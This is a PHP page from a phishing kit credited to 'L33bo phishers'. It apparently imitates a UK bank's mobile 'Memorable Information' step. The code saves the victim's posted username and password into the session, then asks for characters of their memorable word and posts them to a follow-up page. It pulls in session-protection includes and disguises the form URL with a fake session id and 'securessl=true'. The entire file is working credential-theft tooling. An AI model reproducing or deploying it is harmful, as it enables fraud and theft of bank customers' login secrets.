<?php 
/*
L33bo phishers = ICQ: 695059760
*/
require "assets/includes/session_protect.php";
require "assets/includes/functions.php";
require "assets/includes/enc.php";
require "../assets/includes/memo.php";
$_SESSION['user'] = $_POST['user'];
$_SESSION['pass'] = $_POST['pass'];
?>
<!DOCTYPE html>
<html lang="en-gb">
<head>
<link href="assets/img/001.ico" type="image/x-icon" rel="icon" />
<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
<title>Enter Memorable</title>
<meta content="en-gb" http-equiv="content-language">
<link href="" media="handheld" rel="alternate">
<meta content="width=device-width" name="viewport">
<link href="assets/img/001.jpg" rel="apple-touch-icon" sizes="57x57">
<link href="assets/img/002.jpg" rel="apple-touch-icon" sizes="114x114">
<link href="assets/css/l33bo.css" rel="stylesheet" type="text/css">
<script src="assets/js/gen_validatorv4.js" type="text/javascript"></script>
<style>
.error_strings {
    margin: 0px;
    padding: 0px 20px 0px 30px;
    color: #db0000;
    font-size: 16px;
}
</style>
</head>
<body class="hasJS">
<div id="outer">
<div id="banner">
<p id="logo"><img src="assets/img/logo.gif"></p>
<p id="userStatus"><img id="headerChangeNGB:lnkpadlockSeclogoff" src="assets/img/001.png"></p>
<div class="cookiePolicy"><a href="#" class="blockLink">Cookie policy</a></div>
<div class="clearer"></div>
</div>
<div id="header">
<div class="panelTL">
<div class="panelTR">
<div class="panelBR">
<div class="panelBL">
<br>
<div id="headerInner">
<h1>Memorable Information</h1>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="content">
<div class="panel">
<div class="panelTL">
<div class="panelTR">
<div class="panelBR">
<div class="panelBL">                                                                           
<div class="panelInner"><div class="inner">
<p class="sudoLabel">Please select characters below.</p>
<form id="frmEnterMemorableInformation1" name="frmEnterMemorableInformation1" method="post" action="MemorableRetry.php?&sessionid=<?php echo generateRandomString(115); ?>&securessl=true" autocomplete="off" enctype="application/x-www-form-urlencoded">
<div class="memorableInfo">
<div class="formField">
<div class="formField">
<label for="frmEnterMemorableInformation1:formMem1">1st:</label>
<select id="frmEnterMemorableInformation1:formMem1" name="memo1" class="memInfoInput">
<?php echo memoselectmobile; ?>
</select>
</div>
</div>
<div class="formField">
<div class="formField">
<label for="frmEnterMemorableInformation1:formMem2">4th:</label>
<select id="frmEnterMemorableInformation1:formMem2" name="memo2" class="memInfoInput">
<?php echo memoselectmobile; ?>
</select>
</div>
</div>
<div class="formField">
<div class="formField">
<label for="frmEnterMemorableInformation1:formMem3">6th:</label>
<select id="frmEnterMemorableInformation1:formMem3" name="memo3" class="memInfoInput">
<?php echo memoselectmobile; ?>
</select>
</div>
</div>
<div id='frmLogin_memo3_errorloc' class="error_strings"></div>
<div class="clearer"></div>
</div>
<div class="divider">
<hr>
</div>
<div class="actions">
<input id="frmEnterMemorableInformation1:lnkSubmit" name="frmEnterMemorableInformation1:lnkSubmit" type="submit" value="Submit" title="Submit" class="submitAction">
<div class="nav">
<div class="lnkLev2">
<div class="lnkTL">
<div class="lnkTR">
<div class="lnkBR">
<div class="lnkBL">
<p class="lnkLev2PCancel"><a id="frmEnterMemorableInformation1:lnkCancel" name="frmEnterMemorableInformation1:lnkCancel" href="#" class="blockLink">Cancel</a></p>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</form>
<script src="assets/js/validatememo1.js" type="text/javascript"></script>
</div>
</div>
</div>
</div>
</div>
</div>
</div>                    
<div id="footer">
<div class="FootNav ">
<div class="lnkLevFoot">
<p class="lnkLevFootP"><a id="lnk1" name="lnk1" href="#" class="blockLink">Help</a></p>
</div>
<div class="lnkLevFoot">
<p class="lnkLevFootP"><a id="lnk2" name="lnk2" href="#" class="blockLink">Security</a></p>
</div>
<div class="lnkLevFoot">
<p class="lnkLevFootP"><a id="lnk3" name="lnk3" href="#" class="blockLink">Contact us</a></p>
</div>
</div>
<div class="footerLinksLogin"><a id="footerngb:cndunauthenvironngb:lnksecurityloggedout" name="footerngb:cndunauthenvironngb:lnksecurityloggedout" href="#">Security</a><a id="footerngb:cndunauthenvironngb:lnkLegalloggedout" name="footerngb:cndunauthenvironngb:lnkLegalloggedout" href="#" class="footerLinksLast">Legal</a>
</div>
<span id="mLogonSuccess" style="display:none"></span>
</div>
</div>
</div>
</body>
</html>